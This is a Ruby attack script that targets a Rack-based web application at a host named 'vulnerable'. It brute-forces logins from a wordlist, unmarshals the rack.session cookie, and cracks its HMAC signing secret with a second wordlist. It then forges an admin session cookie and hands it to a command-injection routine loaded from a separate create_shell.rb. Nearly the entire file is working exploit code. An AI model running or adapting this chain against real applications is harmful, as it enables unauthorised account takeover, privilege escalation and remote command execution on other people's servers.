#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'pp'
require 'base64'
require 'data_mapper'
require 'openssl'
require './create_shell.rb'

class User
	attr_accessor :admin
end

def decode_cookie(cookie)
	puts "Decoding cookie"
	object, c = ''
	show_wait_spinner{
		c = cookie.split('=')[1].split("; ")[0]
		cook, signature = c.split("--")
		decoded = Base64.decode64(URI.decode(cook))
		DataMapper.setup(:default, 'sqlite3::memory')
		begin
			object = Marshal.load(decoded)
		rescue ArgumentError => e
			puts "Error: "+e.to_s
		end
	}
	puts "Decoded"
	return object, c
end

def reencode_cookie(object, secret, url)
	puts "Reencoding cookie...\n"
	
	object["user"].admin = true
	nc = Base64.encode64(Marshal.dump(object))
	ns = sign_secret_key(nc, secret)
	new_cookie = URI.encode(nc).gsub("=", "%3D")+"--"+ns
	resp = Net::HTTP.start(url.host, url.port) do |http|
		http.get("/", {"Cookie" => "rack.session="+new_cookie})
	end

	if resp.code == "200"
		puts "Encoded successfully"
		return new_cookie
	end
	
	

end

def sign_secret_key(data, secret)
	return OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

def crack_racksession_secret_key(cookie, file)
	puts "Cracking secret...\n"
	secret = ''
	show_wait_spinner{
		sleep 1
		value, signed = cookie.split("--",2)
		value = URI.decode(value)

		File.readlines(file).each do |c|
			c.chomp!
			if sign_secret_key(value, c) == signed
				secret = c		
			end
		end
	}
	puts "Cracked! Secret is #{secret}"
	return secret
	

end

def show_wait_spinner(fps=10)
	chars = %w[| / - \\]
	delay = 1.0/fps
	iter = 0
	spinner = Thread.new do
		while iter do
			print chars[(iter+=1) % chars.length]
			sleep delay
			print "\b"	
		end
	end
	yield.tap{
		iter = false
		spinner.join
	} 
end


#################################################################
####### Main Functionality ######################################
URL = "http://vulnerable/login"
url = URI.parse(URL)
home_url = "http://vulnerable/"
home = URI.parse(home_url)
cred = ''
response = ""
exit unless ARGV[0]

print "Brute forcing login...\n"
show_wait_spinner{

	File.readlines(ARGV[0]).each do |credential|
		credential.chomp!
		resp = Net::HTTP.start(url.host, url.port) do |http|
			resp = http.post(url.request_uri, "login=#{credential}&password=#{credential}")
		end

		if resp.header['Location'] !~ /login/
			cred = credential		
			response = resp
		end
	end
}

puts "Valid credentials found: #{cred}/#{cred}"
cookie =  response.header['Set-Cookie']
object, c = decode_cookie(cookie)
secret = crack_racksession_secret_key(c, ARGV[1])	
admin_cookie = reencode_cookie(object, secret, home)
create_command_injection(home, admin_cookie)

